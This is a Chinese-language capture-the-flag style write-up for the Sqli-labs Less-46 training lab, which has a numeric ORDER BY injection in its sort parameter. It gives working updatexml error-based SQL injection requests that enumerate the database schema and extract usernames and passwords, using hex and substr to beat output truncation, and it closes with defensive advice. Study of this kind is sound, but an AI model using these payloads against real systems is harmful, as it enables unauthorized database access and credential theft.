## 题目: Sqli‑labs Less‑46

## 题目描述
GET传入sort排序参数，数字型ORDER BY注入，开启SQL报错回显。ORDER BY语法不支持UNION，采用updatexml XPATH报错注入获取数据；报错输出存在31字符截断限制。

## 核心原理
```php
$id = $_GET['sort'];
$sql = "SELECT * FROM users ORDER BY $id";
```
关键点：sort 参数直接拼接进 ORDER BY，无引号；`and 1=1/and 1=2`页面无差异，布尔判断失效；updatexml 构造非法 XPATH 把数据带出报错；长数据会截断，可使用`substr`分段或`hex()`编码规避，`0x7e`即`~`用作数据标记。

**解题思路**
1. Burp 抓包修改 sort 参数，验证报错注入；
2. updatexml 报错依次爆出库、表、字段；
3. 使用 substr 分段或者 hex 编码解决 31 字符截断问题读取账号密码；
4. 可编写脚本自动化获取完整数据。

## 解题步骤
### 1. 验证报错注入 Burp 包
```
GET /sqli-labs/Less-46/?sort=1 and updatexml(1,concat(0x7e,database()),1) HTTP/1.1
Host: 127.0.0.1
```
页面报错：`XPATH syntax error: '~security'`

### 2. 爆表名 Burp 包
```
GET /sqli-labs/Less-46/?sort=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) HTTP/1.1
Host: 127.0.0.1
```
报错返回：`~emails,referers,uagents,users`

### 3. 爆字段名 Burp 包
```
GET /sqli-labs/Less-46/?sort=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273)),1) HTTP/1.1
Host: 127.0.0.1
```
报错返回：`~id,username,password`

### 4. hex 编码读取 users 数据 Burp 包（解决截断）
```
GET /sqli-labs/Less-46/?sort=1 and updatexml(1,concat(0x7e,substr(hex((select group_concat(username,0x3a,password) from users)),1,30)),1) HTTP/1.1
Host: 127.0.0.1
```
> 
> 多次修改 substr 第二个偏移参数分段获取全部 hex 字符串，再解码得到明文。

## 踩坑记录
1. ORDER BY 位置不支持 UNION 查询，不能使用联合注入。
2. XPATH 报错最多输出 31 字符，长数据直接读取会截断，需要 substr 分段或 hex 编码。
3. 库内用户名存在单引号特殊字符，hex 编码可以规避单引号带来的解析问题。
4. ORDER BY 后`and 1=1`与`and 1=2`页面无变化，布尔盲注无效。
5. `0x7e(~)`标记符，便于从报错信息中定位提取目标数据。

## 知识点总结
- ORDER BY 注入：注入点处于排序子句，语法受限，优先报错注入，也可选择时间盲注。
- updatexml 报错注入：构造非法 XPATH 表达式，将查询结果从报错信息输出。
- 31 字符截断解决方案：substr 分段读取、hex 十六进制编码。
- 防御：sort 参数配置白名单，仅放行允许的排序字段；使用预编译；关闭生产环境 SQL 报错回显。
